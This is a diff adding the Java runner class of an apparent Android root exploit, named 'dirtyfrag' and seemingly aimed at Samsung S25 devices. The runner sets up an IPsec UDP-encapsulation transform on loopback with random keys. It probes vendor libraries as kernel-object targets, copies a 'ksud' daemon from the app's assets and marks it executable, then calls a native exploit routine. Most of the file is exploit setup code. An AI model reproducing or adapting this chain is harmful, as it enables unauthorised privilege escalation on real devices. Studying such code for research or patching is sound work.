+package dev.busung.s25uroot.dirtyfrag;
+
+import android.content.Context;
+import android.net.IpSecAlgorithm;
+import android.net.IpSecManager;
+import android.net.IpSecTransform;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.DatagramSocket;
+import java.net.InetAddress;
+import java.security.SecureRandom;
+
+public class DfExploitRunner {
+
+    static { System.loadLibrary("exp"); }
+
+    private static boolean prestagedKsud = false;
+
+    static native int nativeRunAll(DfReporter reporter, String koTarget, int encapPort, int spi,
+                                    byte[] aesCbcKey, byte[] hmacKey, int icvLen,
+                                    int senderPort, boolean softReboot);
+
+    /**
+     * Same run, but the caller already staged the selected backend's ksud where
+     * the native handoff expects it. Used so every backend keeps its own daemon
+     * instead of funneling all flavours through one binary.
+     */
+    public static int runPrestaged(Context ctx, DfReporter reporter, boolean softReboot) throws Exception {
+        prestagedKsud = true;
+        try {
+            return run(ctx, reporter, softReboot);
+        } finally {
+            prestagedKsud = false;
+        }
+    }
+
+    public static int run(Context ctx, DfReporter reporter, boolean softReboot) throws Exception {
+        String koTarget = detectKoTarget(reporter);
+
+        reporter.report("=== setup ===\n");
+        IpSecManager ipsec = (IpSecManager) ctx.getSystemService(Context.IPSEC_SERVICE);
+        if (ipsec == null) throw new IllegalStateException("IpSecManager unavailable (requires API 28+)");
+
+        IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
+        int encapPort = encapSock.getPort();
+        reporter.report("encap port: " + encapPort + "\n");
+
+        InetAddress loopback = InetAddress.getByName("127.0.0.1");
+        IpSecManager.SecurityParameterIndex spiObj =
+                ipsec.allocateSecurityParameterIndex(loopback);
+        int spiVal = spiObj.getSpi();
+        reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");
+
+        SecureRandom rng = new SecureRandom();
+        byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
+        byte[] hmacKey = new byte[32]; rng.nextBytes(hmacKey);
+
+        int authTruncBits = 128;
+        IpSecAlgorithm enc  = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
+        IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, authTruncBits);
+
+        DatagramSocket senderSock = new DatagramSocket();
+        int senderPort = senderSock.getLocalPort();
+        senderSock.close();
+
+        IpSecTransform transform = new IpSecTransform.Builder(ctx)
+                .setEncryption(enc)
+                .setAuthentication(auth)
+                .setIpv4Encapsulation(encapSock, senderPort)
+                .buildTransportModeTransform(loopback, spiObj);
+
+        int rc;
+        try {
+            if (!prestagedKsud) stageKsud(ctx, reporter);
+            reporter.report("\n");
+            reporter.report("=== exploit ===\n");
+            rc = nativeRunAll(reporter, koTarget, encapPort, spiVal, aesKey, hmacKey, authTruncBits / 8, senderPort, softReboot);
+        } finally {
+            transform.close();
+            spiObj.close();
+            encapSock.close();
+        }
+
+        return rc;
+    }
+
+    public static String detectKoTarget(DfReporter reporter) {
+        String[] candidates = {
+            "/vendor/lib64/libbinderdebug.so",
+            "/vendor/lib64/libstagefrighthw.so",
+            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+        };
+        for (String path : candidates) {
+            if (new File(path).exists()) {
+                reporter.report("found ko_target: " + path + "\n");
+                return path;
+            }
+            reporter.report(path + " not found\n");
+        }
+        reporter.report("Could not find vendor_file target, falling back to libbinderdebug.so\n");
+        return candidates[0];
+    }
+
+    public static void stageKsud(Context ctx, DfReporter reporter) throws IOException {
+        File dest = new File(ctx.createDeviceProtectedStorageContext().getFilesDir().getParentFile(), "ksud");
+        File tmp = new File(dest.getPath() + ".tmp");
+        try (InputStream in = ctx.getAssets().open("df/ksud");
+             OutputStream out = new FileOutputStream(tmp)) {
+            byte[] buf = new byte[8192];
+            for (int n; (n = in.read(buf)) != -1; ) out.write(buf, 0, n);
+        } catch (IOException e) {
+            tmp.delete();
+            throw e;
+        }
+        if (!tmp.renameTo(dest)) { tmp.delete(); throw new IOException("rename failed: " + dest); }
+        if (!dest.setExecutable(true, false))
+            throw new IOException("setExecutable failed: " + dest.getAbsolutePath());
+        reporter.report("ksud staged to: " + dest.getAbsolutePath() + "\n");
+    }
+}
